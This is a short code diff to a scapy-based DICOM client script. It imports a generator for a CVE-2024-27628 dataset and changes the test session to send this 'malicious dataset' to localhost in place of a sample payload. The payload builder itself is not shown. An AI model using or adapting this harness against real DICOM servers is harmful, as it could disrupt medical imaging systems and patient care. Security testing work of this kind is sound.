@@ -5,6 +5,7 @@ from scapy.supersocket import StreamSocket
 import socket
 from scapy.layers.inet import TCP
 import struct
+from cve_datasets import create_cve_2024_27628_dataset
 
 # ------------------- DICOM Base Protocol Support -------------------
 class DICOM(Packet):
@@ -301,8 +302,9 @@ if __name__ == "__main__":
         session = DICOMSession("TEST_CLIENT", "TEST_AE", "localhost")
         if session.associate():
             print("Association established")
-            # Send sample DICOM dataset
-            session.send_data(b"\x02\x00\x00\x00\x00\x04\x00\x00\x10\x01")
+            # Send malicious dataset
+            malicious_data = create_cve_2024_27628_dataset()
+            session.send_data(malicious_data)
             # Graceful release
             if session.release():
                 print("Association released")
